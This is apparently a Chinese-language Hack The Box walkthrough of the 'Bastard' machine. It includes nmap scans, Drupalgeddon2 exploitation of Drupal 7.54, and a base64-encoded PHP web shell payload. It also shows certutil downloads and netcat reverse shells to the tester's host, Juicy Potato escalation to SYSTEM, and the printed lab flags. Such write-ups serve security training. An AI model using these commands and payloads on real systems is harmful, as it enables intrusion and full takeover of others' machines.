

# 端口扫描

全端口扫描
~~~
┌──(kali㉿kali)-[~/bastard]
└─$ sudo nmap -sT -p- --min-rate 2000 10.10.10.9 -oA nmap/ports
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 08:58 EST
Nmap scan report for 10.10.10.9
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc

Nmap done: 1 IP address (1 host up) scanned in 66.40 seconds

~~~

默认脚本扫描
~~~
┌──(kali㉿kali)-[~/bastard]
└─$ sudo nmap -sT -sV -sC -O -p80,135 10.10.10.9 -oA nmap/sC
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 09:01 EST
Nmap scan report for 10.10.10.9
Host is up (0.096s latency).

PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
135/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone|general purpose|specialized
Running (JUST GUESSING): Microsoft Windows Phone|8|7|2008|8.1|Vista (92%)
OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.93 seconds

~~~

漏洞脚本扫描
~~~
┌──(kali㉿kali)-[~/bastard]
└─$ sudo nmap -sT --script=vuln -p80,135 10.10.10.9 -oA nmap/vuln
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 09:02 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.9
Host is up (0.12s latency).

PORT    STATE SERVICE
80/tcp  open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.9
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.10.9:80/
|     Form id: user-login-form
|     Form action: /node?destination=node
|     
|     Path: http://10.10.10.9:80/user/password
|     Form id: user-pass
|     Form action: /user/password
|     
|     Path: http://10.10.10.9:80/user/register
|     Form id: user-register-form
|     Form action: /user/register
|     
|     Path: http://10.10.10.9:80/node?destination=node
|     Form id: user-login-form
|     Form action: /node?destination=node
|     
|     Path: http://10.10.10.9:80/user
|     Form id: user-login
|     Form action: /user
|     
|     Path: http://10.10.10.9:80/user/
|     Form id: user-login
|_    Form action: /user/
| http-enum: 
|   /rss.xml: RSS or Atom feed
|_  /robots.txt: Robots file
135/tcp open  msrpc

Nmap done: 1 IP address (1 host up) scanned in 36415.69 seconds

~~~

UDP扫描
~~~
┌──(kali㉿kali)-[~/bastard]
└─$ sudo nmap -sU --top-ports 20 10.10.10.9 -oA nmap/UDP
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 09:03 EST
Nmap scan report for 10.10.10.9
Host is up (0.11s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 3.52 seconds

~~~

# 80(web)

访问发现是Drupal的登录页

![](Pasted%20image%2020241113220957.png)

试一下常见弱口令，没有登陆成功
~~~
admin::admin
admin::123456
~~~

因为是Drupal的CMS，查找一下有没有公开的漏洞可以利用
首先获取Drupal的版本信息，询问ChatGPT得知Drupal的版本信息在`CHANGELOG.txt`中
尝试访问一下

![](Pasted%20image%2020241113221054.png)

我们得到了Drupal的版本为7.54

查找一下nday

![](Pasted%20image%2020241113221200.png)

似乎是有RCE的漏洞，尝试利用一下

~~~
┌──(kali㉿kali)-[~/bastard]
└─$ searchsploit Drupal 7.5 -m 44449
[!] Could not find EDB-ID #


  Exploit: Samba 2.2.x - Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/7
     Path: /usr/share/exploitdb/exploits/linux/remote/7.pl
    Codes: OSVDB-4469, CVE-2003-0201
 Verified: True
File Type: Perl script text executable
Copied to: /home/kali/bastard/7.pl


  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/44449
     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
    Codes: CVE-2018-7600
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /home/kali/bastard/44449.rb


~~~

直接拿到shell了

~~~
┌──(kali㉿kali)-[~/bastard]
└─$ ruby 44449.rb http://10.10.10.9
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.9/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.9/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo VBCQJRCP
[+] Result : VBCQJRCP
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.9/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.10.10.9/sites/default/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.10.10.9/sites/default/files/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/files/)
[*] Moving : ./sites/default/files/.htaccess
[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
[!] FAILED : Couldn't find a writeable web path
--------------------------------------------------------------------------------
[*] Dropping back to direct OS commands
drupalgeddon2>> whoami
nt authority\iusr
drupalgeddon2>>

~~~

# 提权

测试了几个命令，发现利用脚本给的shell并不稳定，功能也有问题，我们尝试完善一下交互性

上传一个nc给靶机，先确定一下靶机是32位还是64位

靶机为64位，并且Hotfix没有开启

~~~
drupalgeddon2>> systeminfo
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 
System Boot Time:          13/11/2024, 3:43:20 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.552 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.553 MB
Virtual Memory: In Use:    542 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9

~~~

下载一个64位的nc.exe
这里尝试php开启http服务来传文件

~~~
php -S 0:80
~~~

使用certutil.exe来下载

~~~
drupalgeddon2>> certutil.exe -urlcache -split -f http://10.10.16.18:80/nc64.exe nc64.exe
****  Online  ****
  0000  ...
  b0d8
CertUtil: -URLCache command completed successfully.
drupalgeddon2>>

~~~

反弹一个shell

~~~
drupalgeddon2>> nc64.exe 10.10.16.18 443 -e cmd.exe
~~~

拿到交互性较好的shell

~~~
┌──(kali㉿kali)-[~/bastard]
└─$ sudo rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.18] from (UNKNOWN) [10.10.10.9] 60457
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>
~~~

在用户dimitris的桌面找到了userflag

~~~
c:\Users\dimitris\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C4CD-C60B

 Directory of c:\Users\dimitris\Desktop

19/03/2017  08:04     <DIR>          .
19/03/2017  08:04     <DIR>          ..
13/11/2024  03:44                 34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   4.134.109.184 bytes free

c:\Users\dimitris\Desktop>type user.txt
type user.txt
166d433451a9bb9f47b6d290fae09a61

~~~

之前提到Hotfix没有开启，大概率存在内核漏洞

google了一番发现winddows server 2019以前的版本都可能存在Juicy Potato
前提是开启了SeImpersonatePrivilege权限

~~~
whoami /priv
~~~

发现权限居然开启了，那很可能存在Juicy Potato提权的可能

~~~
C:\inetpub\drupal-7.54>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

~~~

下载[JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)

~~~
C:\inetpub\drupal-7.54>JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc64.exe -e cmd.exe 10.10.16.18 4444" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc64.exe -e cmd.exe 10.10.16.18 4444" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

~~~

成功收到了system的shell

~~~
┌──(kali㉿kali)-[~/bastard]                                                        └─$ sudo rlwrap nc -lvnp 4444                                                      listening on [any] 4444 ...                                                        connect to [10.10.16.18] from (UNKNOWN) [10.10.10.9] 61306                         Microsoft Windows [Version 6.1.7600]                                               Copyright (c) 2009 Microsoft Corporation.  All rights reserved.                                                                                                       C:\Windows\system32>whoami                                                         whoami                                                                             nt authority\system       
~~~

拿到rootflag

~~~
c:\Users\Administrator\Desktop>type root.txt
type root.txt
90cc1d069148ccffd7e5ebd5e58d1ac4

~~~